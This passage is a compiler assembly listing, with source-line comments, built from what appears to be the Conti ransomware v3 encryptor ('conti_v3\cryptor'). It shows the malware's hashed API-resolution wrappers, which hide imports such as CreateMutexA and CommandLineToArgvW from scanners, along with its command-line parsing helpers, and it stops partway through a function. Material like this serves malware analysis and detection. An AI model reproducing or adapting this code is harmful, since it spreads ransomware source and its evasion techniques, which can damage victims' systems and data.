	DD	imagerel $unwind$?HandleCommandLine@@YAHPEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$9$?HandleCommandLine@@YAHPEA_W@Z DD 020021H
	DD	020f400H
	DD	imagerel $LN527
	DD	imagerel $LN527+128
	DD	imagerel $unwind$?HandleCommandLine@@YAHPEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$8$?HandleCommandLine@@YAHPEA_W@Z DD 040021H
	DD	020f400H
	DD	0287400H
	DD	imagerel $LN527
	DD	imagerel $LN527+128
	DD	imagerel $unwind$?HandleCommandLine@@YAHPEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$7$?HandleCommandLine@@YAHPEA_W@Z DD 060021H
	DD	020f400H
	DD	0287400H
	DD	0276400H
	DD	imagerel $LN527
	DD	imagerel $LN527+128
	DD	imagerel $unwind$?HandleCommandLine@@YAHPEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$6$?HandleCommandLine@@YAHPEA_W@Z DD 080021H
	DD	020f400H
	DD	029c400H
	DD	0287400H
	DD	0276400H
	DD	imagerel $LN527
	DD	imagerel $LN527+128
	DD	imagerel $unwind$?HandleCommandLine@@YAHPEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$5$?HandleCommandLine@@YAHPEA_W@Z DD 040021H
	DD	020f400H
	DD	0287400H
	DD	imagerel $LN527
	DD	imagerel $LN527+128
	DD	imagerel $unwind$?HandleCommandLine@@YAHPEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$4$?HandleCommandLine@@YAHPEA_W@Z DD 060021H
	DD	020f400H
	DD	0287400H
	DD	0276400H
	DD	imagerel $LN527
	DD	imagerel $LN527+128
	DD	imagerel $unwind$?HandleCommandLine@@YAHPEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$chain$3$?HandleCommandLine@@YAHPEA_W@Z DD 088921H
	DD	0287489H
	DD	0276481H
	DD	020f410H
	DD	029c408H
	DD	imagerel $LN527
	DD	imagerel $LN527+128
	DD	imagerel $unwind$?HandleCommandLine@@YAHPEA_W@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?HandleCommandLine@@YAHPEA_W@Z DD 062119H
	DD	0210113H
	DD	0d005e007H
	DD	050023003H
	DD	imagerel __GSHandlerCheck
	DD	0f0H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$WinMain DD 0b2e19H
	DD	0247420H
	DD	0236420H
	DD	0223420H
	DD	01e0120H
	DD	0e012f014H
	DD	05010H
	DD	imagerel __GSHandlerCheck
	DD	0e8H
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetCommandLineW@@YAPEA_WXZ
_TEXT	SEGMENT
?pGetCommandLineW@@YAPEA_WXZ PROC			; pGetCommandLineW, COMDAT

; 292  : {

$LN4:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 293  : 	LPWSTR(WINAPI * pFunction)();
; 294  : 	pFunction = (LPWSTR(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8a0ae76f, 85);//GetProcAddress(hKernel32, OBFA("GetCommandLineW"));

  00004	ba 0f 00 00 00	 mov	 edx, 15
  00009	41 b8 6f e7 0a
	8a		 mov	 r8d, -1978996881	; 8a0ae76fH
  0000f	44 8d 4a 46	 lea	 r9d, QWORD PTR [rdx+70]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 296  : }

  00018	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 295  : 	return pFunction();

  0001c	48 ff e0	 rex_jmp rax
?pGetCommandLineW@@YAPEA_WXZ ENDP			; pGetCommandLineW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z
_TEXT	SEGMENT
lpMutexAttributes$dead$ = 48
bInitialOwner$dead$ = 56
lpName$ = 64
?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z PROC ; pCreateMutexA, COMDAT

; 303  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 304  : 	HANDLE(WINAPI * pFunction)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
; 305  : 	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, BOOL, LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x20d8fa8c, 84);//GetProcAddress(hKernel32, OBFA("CreateMutexA"));

  00006	ba 0f 00 00 00	 mov	 edx, 15
  0000b	49 8b d8	 mov	 rbx, r8
  0000e	41 b8 8c fa d8
	20		 mov	 r8d, 551090828		; 20d8fa8cH
  00014	44 8d 4a 45	 lea	 r9d, QWORD PTR [rdx+69]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 306  : 	return pFunction(lpMutexAttributes, bInitialOwner, lpName);

  0001d	4c 8b c3	 mov	 r8, rbx
  00020	ba 01 00 00 00	 mov	 edx, 1
  00025	33 c9		 xor	 ecx, ecx

; 307  : }

  00027	48 83 c4 20	 add	 rsp, 32			; 00000020H
  0002b	5b		 pop	 rbx

; 306  : 	return pFunction(lpMutexAttributes, bInitialOwner, lpName);

  0002c	48 ff e0	 rex_jmp rax
?pCreateMutexA@@YAPEAXPEAU_SECURITY_ATTRIBUTES@@HPEBD@Z ENDP ; pCreateMutexA
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrcmpiW@@YAHPEB_W0@Z
_TEXT	SEGMENT
lpString1$ = 48
lpString2$ = 56
?plstrcmpiW@@YAHPEB_W0@Z PROC				; plstrcmpiW, COMDAT

; 341  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 342  : 	int(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  0000d	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 345  : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 344  : 	return pFunction(lpString1, lpString2);

  00034	48 ff e0	 rex_jmp rax
?plstrcmpiW@@YAHPEB_W0@Z ENDP				; plstrcmpiW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z
_TEXT	SEGMENT
lpCmdLine$ = 48
pNumArgs$ = 56
?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z PROC	; pCommandLineToArgvW, COMDAT

; 700  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 701  : 	LPWSTR* (WINAPI * pFunction)(LPCWSTR, int*);
; 702  : 	pFunction = (LPWSTR * (WINAPI*)(LPCWSTR, int*))getapi::GetProcAddressEx2(NULL, SHELL32_MODULE_ID, 0x6dd8e1ea, 48);//GetProcAddress(hShell32, OBFA("CommandLineToArgvW"));

  0000d	41 b8 ea e1 d8
	6d		 mov	 r8d, 1842930154		; 6dd8e1eaH
  00013	ba 17 00 00 00	 mov	 edx, 23
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 19	 lea	 r9d, QWORD PTR [rdx+25]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 703  : 	return pFunction(lpCmdLine, pNumArgs);

  00024	48 8b d3	 mov	 rdx, rbx
  00027	48 8b cf	 mov	 rcx, rdi

; 704  : }

  0002a	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  0002f	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00033	5f		 pop	 rdi

; 703  : 	return pFunction(lpCmdLine, pNumArgs);

  00034	48 ff e0	 rex_jmp rax
?pCommandLineToArgvW@@YAPEAPEA_WPEB_WPEAH@Z ENDP	; pCommandLineToArgvW
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z
_TEXT	SEGMENT
CodePage$dead$ = 80
dwFlags$dead$ = 88
lpWideCharStr$ = 96
cchWideChar$ = 104
lpMultiByteStr$ = 112
cbMultiByte$ = 120
lpDefaultChar$dead$ = 128
lpUsedDefaultChar$dead$ = 136
?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z PROC	; pWideCharToMultiByte, COMDAT

; 1189 : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 40	 sub	 rsp, 64			; 00000040H

; 1190 : 	int(WINAPI * pFunction)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
; 1191 : 	pFunction = (int(WINAPI*)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x7ae2521c, 9);

  0000a	ba 0f 00 00 00	 mov	 edx, 15
  0000f	41 8b d9	 mov	 ebx, r9d
  00012	49 8b f8	 mov	 rdi, r8
  00015	41 b8 1c 52 e2
	7a		 mov	 r8d, 2061652508		; 7ae2521cH
  0001b	44 8d 4a fa	 lea	 r9d, QWORD PTR [rdx-6]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1192 : 	return pFunction(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);

  00024	33 c9		 xor	 ecx, ecx
  00026	44 8b cb	 mov	 r9d, ebx
  00029	48 89 8c 24 88
	00 00 00	 mov	 QWORD PTR lpUsedDefaultChar$dead$[rsp], rcx
  00031	4c 8b c7	 mov	 r8, rdi
  00034	48 89 8c 24 80
	00 00 00	 mov	 QWORD PTR lpDefaultChar$dead$[rsp], rcx
  0003c	33 d2		 xor	 edx, edx
  0003e	b9 e9 fd 00 00	 mov	 ecx, 65001		; 0000fde9H

; 1193 : }

  00043	48 8b 5c 24 50	 mov	 rbx, QWORD PTR [rsp+80]
  00048	48 83 c4 40	 add	 rsp, 64			; 00000040H
  0004c	5f		 pop	 rdi

; 1192 : 	return pFunction(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);

  0004d	48 ff e0	 rex_jmp rax
?pWideCharToMultiByte@@YAHIKPEB_WHPEADHPEBDPEAH@Z ENDP	; pWideCharToMultiByte
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT ??__Eg_Path@@YAXXZ
text$di	SEGMENT
??__Eg_Path@@YAXXZ PROC					; `dynamic initializer for 'g_Path'', COMDAT

; 15   : STATIC std::wstring g_Path;

  00000	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??__Fg_Path@@YAXXZ ; `dynamic atexit destructor for 'g_Path''
  00007	e9 00 00 00 00	 jmp	 atexit
??__Eg_Path@@YAXXZ ENDP					; `dynamic initializer for 'g_Path''
text$di	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??__Fg_Path@@YAXXZ
text$yd	SEGMENT
??__Fg_Path@@YAXXZ PROC					; `dynamic atexit destructor for 'g_Path'', COMDAT
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00004	48 8b 15 18 00
	00 00		 mov	 rdx, QWORD PTR ?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A+24
  0000b	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  0000f	76 35		 jbe	 SHORT $LN27@dynamic
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00011	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A
  00018	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00020	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00027	72 18		 jb	 SHORT $LN26@dynamic

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00029	4c 8b 41 f8	 mov	 r8, QWORD PTR [rcx-8]
  0002d	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00031	49 2b c8	 sub	 rcx, r8

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00034	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  00038	48 83 f8 1f	 cmp	 rax, 31
  0003c	77 26		 ja	 SHORT $LN23@dynamic

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0003e	49 8b c8	 mov	 rcx, r8
$LN26@dynamic:

; 268  :         ::operator delete(_Ptr, _Bytes);

  00041	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN27@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  00046	66 0f 6f 05 00
	00 00 00	 movdqa	 xmm0, XMMWORD PTR __xmm@00000000000000070000000000000000

; 4874 :         _My_data._Myres  = _Small_string_capacity;
; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  0004e	33 c0		 xor	 eax, eax
  00050	f3 0f 7f 05 10
	00 00 00	 movdqu	 XMMWORD PTR ?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A+16, xmm0
  00058	66 89 05 00 00
	00 00		 mov	 WORD PTR ?g_Path@@3V?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@A, ax
  0005f	48 83 c4 28	 add	 rsp, 40			; 00000028H
  00063	c3		 ret	 0
$LN23@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00064	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00069	cc		 int	 3
$LN33@dynamic:
??__Fg_Path@@YAXXZ ENDP					; `dynamic atexit destructor for 'g_Path''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT ?SToI@@YAHPEAD@Z
_TEXT	SEGMENT
str$ = 8
?SToI@@YAHPEAD@Z PROC					; SToI, COMDAT

; 20   : SToI(__in char* str) {

$LN44:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx

; 21   : 	unsigned int strLen = 0;

  00005	45 33 c9	 xor	 r9d, r9d

; 22   : 	unsigned int i = 0;

  00008	33 d2		 xor	 edx, edx
  0000a	4c 8b d1	 mov	 r10, rcx

; 23   : 	while (str[i] != '\0') {

  0000d	38 11		 cmp	 BYTE PTR [rcx], dl
  0000f	74 0c		 je	 SHORT $LN3@SToI
$LL2@SToI:

; 24   : 		strLen += 1;

  00011	41 ff c1	 inc	 r9d

; 25   : 		i++;

  00014	8d 52 01	 lea	 edx, DWORD PTR [rdx+1]
  00017	80 3c 0a 00	 cmp	 BYTE PTR [rdx+rcx], 0
  0001b	75 f4		 jne	 SHORT $LL2@SToI
$LN3@SToI:

; 26   : 	}
; 27   : 
; 28   : 	int num = 0;

  0001d	45 33 db	 xor	 r11d, r11d

; 29   : 	int ten;
; 30   : 	BOOL signFlag = TRUE; //true: +, false: -
; 31   : 	for (i = 0; i < strLen; i++) {

  00020	33 d2		 xor	 edx, edx
  00022	41 8d 5b 01	 lea	 ebx, QWORD PTR [r11+1]
  00026	45 85 c9	 test	 r9d, r9d
  00029	74 66		 je	 SHORT $LN31@SToI
  0002b	0f 1f 44 00 00	 npad	 5
$LL6@SToI:

; 32   : 		if (str[i] < '0' || str[i] > '9') {

  00030	45 0f be 02	 movsx	 r8d, BYTE PTR [r10]
  00034	41 8d 40 d0	 lea	 eax, DWORD PTR [r8-48]
  00038	3c 09		 cmp	 al, 9
  0003a	77 2b		 ja	 SHORT $LN11@SToI

; 39   : 				continue;
; 40   : 			}
; 41   : 
; 42   : 			return 0;
; 43   : 		}
; 44   : 
; 45   : 		ten = 1;
; 46   : 		for (unsigned int j = 0; j < strLen - 1 - i; j++) {

  0003c	41 8b c9	 mov	 ecx, r9d
  0003f	b8 01 00 00 00	 mov	 eax, 1
  00044	2b ca		 sub	 ecx, edx
  00046	2b c8		 sub	 ecx, eax
  00048	74 11		 je	 SHORT $LN8@SToI
  0004a	66 0f 1f 44 00
	00		 npad	 6
$LL23@SToI:

; 47   : 			ten *= 10;

  00050	8d 04 80	 lea	 eax, DWORD PTR [rax+rax*4]
  00053	03 c0		 add	 eax, eax
  00055	48 83 e9 01	 sub	 rcx, 1
  00059	75 f5		 jne	 SHORT $LL23@SToI
$LN8@SToI:

; 48   : 		}
; 49   : 
; 50   : 		num += ten * (str[i] - '0');

  0005b	41 8d 48 d0	 lea	 ecx, DWORD PTR [r8-48]
  0005f	0f af c8	 imul	 ecx, eax
  00062	44 03 d9	 add	 r11d, ecx

; 51   : 	}

  00065	eb 19		 jmp	 SHORT $LN4@SToI
$LN11@SToI:

; 33   : 			if (i == 0 && str[i] == '-') {

  00067	85 d2		 test	 edx, edx
  00069	75 2f		 jne	 SHORT $LN13@SToI
  0006b	41 80 f8 2d	 cmp	 r8b, 45			; 0000002dH
  0006f	75 04		 jne	 SHORT $LN32@SToI

; 34   : 				signFlag = FALSE;

  00071	33 db		 xor	 ebx, ebx

; 35   : 				continue;

  00073	eb 0b		 jmp	 SHORT $LN4@SToI
$LN32@SToI:

; 36   : 			}
; 37   : 			if (i == 0 && str[i] == '+') {

  00075	41 80 f8 2b	 cmp	 r8b, 43			; 0000002bH
  00079	75 1f		 jne	 SHORT $LN13@SToI

; 38   : 				signFlag = TRUE;

  0007b	bb 01 00 00 00	 mov	 ebx, 1
$LN4@SToI:

; 29   : 	int ten;
; 30   : 	BOOL signFlag = TRUE; //true: +, false: -
; 31   : 	for (i = 0; i < strLen; i++) {

  00080	ff c2		 inc	 edx
  00082	49 ff c2	 inc	 r10
  00085	41 3b d1	 cmp	 edx, r9d
  00088	72 a6		 jb	 SHORT $LL6@SToI

; 52   : 
; 53   : 	if (signFlag) {

  0008a	85 db		 test	 ebx, ebx
  0008c	75 03		 jne	 SHORT $LN31@SToI

; 54   : 		return num;
; 55   : 	}
; 56   : 	else {
; 57   : 		return -num;

  0008e	41 f7 db	 neg	 r11d
$LN31@SToI:

; 58   : 	}
; 59   : }

  00091	41 8b c3	 mov	 eax, r11d
  00094	48 8b 5c 24 08	 mov	 rbx, QWORD PTR [rsp+8]
  00099	c3		 ret	 0
$LN13@SToI:
  0009a	48 8b 5c 24 08	 mov	 rbx, QWORD PTR [rsp+8]
  0009f	33 c0		 xor	 eax, eax
  000a1	c3		 ret	 0
?SToI@@YAHPEAD@Z ENDP					; SToI
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT ?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z
_TEXT	SEGMENT
Argv$ = 80
Argc$ = 88
ArgName$ = 96
?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z PROC	; GetCommandLineArg, COMDAT

; 68   : {

$LN22:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 6c 24 10	 mov	 QWORD PTR [rsp+16], rbp
  0000a	48 89 74 24 18	 mov	 QWORD PTR [rsp+24], rsi
  0000f	57		 push	 rdi
  00010	41 54		 push	 r12
  00012	41 55		 push	 r13
  00014	41 56		 push	 r14
  00016	41 57		 push	 r15
  00018	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0001c	4c 63 f2	 movsxd	 r14, edx
  0001f	4d 8b e8	 mov	 r13, r8
  00022	4c 8b e1	 mov	 r12, rcx

; 69   : 	if (Argc <= 1) {

  00025	41 83 fe 01	 cmp	 r14d, 1
  00029	7e 4a		 jle	 SHORT $LN17@GetCommand

; 70   : 		return NULL;
; 71   : 	}
; 72   : 
; 73   : 	for (INT i = 1; i < Argc; i++) {

  0002b	bd 01 00 00 00	 mov	 ebp, 1
  00030	4c 3b f5	 cmp	 r14, rbp
  00033	76 40		 jbe	 SHORT $LN17@GetCommand
  00035	8b dd		 mov	 ebx, ebp
  00037	8d 75 01	 lea	 esi, QWORD PTR [rbp+1]
  0003a	66 0f 1f 44 00
	00		 npad	 6
$LL4@GetCommand:

; 74   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00040	49 8b 3c dc	 mov	 rdi, QWORD PTR [r12+rbx*8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00044	ba 0f 00 00 00	 mov	 edx, 15
  00049	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  0004f	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  00053	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  00058	49 8b d5	 mov	 rdx, r13
  0005b	48 8b cf	 mov	 rcx, rdi
  0005e	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp

; 74   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00060	85 c0		 test	 eax, eax
  00062	75 05		 jne	 SHORT $LN2@GetCommand

; 75   : 
; 76   : 			if ((i + 1) < Argc) {

  00064	41 3b f6	 cmp	 esi, r14d
  00067	7c 2b		 jl	 SHORT $LN12@GetCommand
$LN2@GetCommand:

; 70   : 		return NULL;
; 71   : 	}
; 72   : 
; 73   : 	for (INT i = 1; i < Argc; i++) {

  00069	ff c5		 inc	 ebp
  0006b	ff c6		 inc	 esi
  0006d	48 ff c3	 inc	 rbx
  00070	49 3b de	 cmp	 rbx, r14
  00073	7c cb		 jl	 SHORT $LL4@GetCommand
$LN17@GetCommand:

; 78   : 			}
; 79   : 
; 80   : 		}
; 81   : 	}
; 82   : 
; 83   : 	return NULL;

  00075	33 c0		 xor	 eax, eax
$LN1@GetCommand:

; 84   : }

  00077	48 8b 5c 24 50	 mov	 rbx, QWORD PTR [rsp+80]
  0007c	48 8b 6c 24 58	 mov	 rbp, QWORD PTR [rsp+88]
  00081	48 8b 74 24 60	 mov	 rsi, QWORD PTR [rsp+96]
  00086	48 83 c4 20	 add	 rsp, 32			; 00000020H
  0008a	41 5f		 pop	 r15
  0008c	41 5e		 pop	 r14
  0008e	41 5d		 pop	 r13
  00090	41 5c		 pop	 r12
  00092	5f		 pop	 rdi
  00093	c3		 ret	 0
$LN12@GetCommand:

; 77   : 				return Argv[i + 1];

  00094	48 63 c5	 movsxd	 rax, ebp
  00097	49 8b 44 c4 08	 mov	 rax, QWORD PTR [r12+rax*8+8]
  0009c	eb d9		 jmp	 SHORT $LN1@GetCommand
?GetCommandLineArg@@YAPEA_WPEAPEA_WHPEB_W@Z ENDP	; GetCommandLineArg
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\main.cpp
;	COMDAT ?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z
_TEXT	SEGMENT
Argv$ = 48
Argc$ = 56
ArgName$ = 64
?FindCommandLineArg@@YAHPEAPEA_WHPEB_W@Z PROC		; FindCommandLineArg, COMDAT

; 93   : {

$LN20:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 6c 24 10	 mov	 QWORD PTR [rsp+16], rbp
  0000a	48 89 74 24 18	 mov	 QWORD PTR [rsp+24], rsi
  0000f	48 89 7c 24 20	 mov	 QWORD PTR [rsp+32], rdi
  00014	41 56		 push	 r14
  00016	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0001a	49 8b e8	 mov	 rbp, r8
  0001d	4c 8b f1	 mov	 r14, rcx

; 94   : 	if (Argc <= 1) {

  00020	83 fa 01	 cmp	 edx, 1
  00023	7e 47		 jle	 SHORT $LN3@FindComman

; 95   : 		return FALSE;
; 96   : 	}
; 97   : 
; 98   : 	for (INT i = 1; i < Argc; i++) {

  00025	48 63 f2	 movsxd	 rsi, edx
  00028	48 83 fe 01	 cmp	 rsi, 1
  0002c	76 3e		 jbe	 SHORT $LN3@FindComman
  0002e	bb 01 00 00 00	 mov	 ebx, 1
  00033	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL4@FindComman:

; 99   : 		if (!plstrcmpiW(Argv[i], ArgName)) {

  00040	49 8b 3c de	 mov	 rdi, QWORD PTR [r14+rbx*8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  00044	ba 0f 00 00 00	 mov	 edx, 15
  00049	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  0004f	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  00053	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

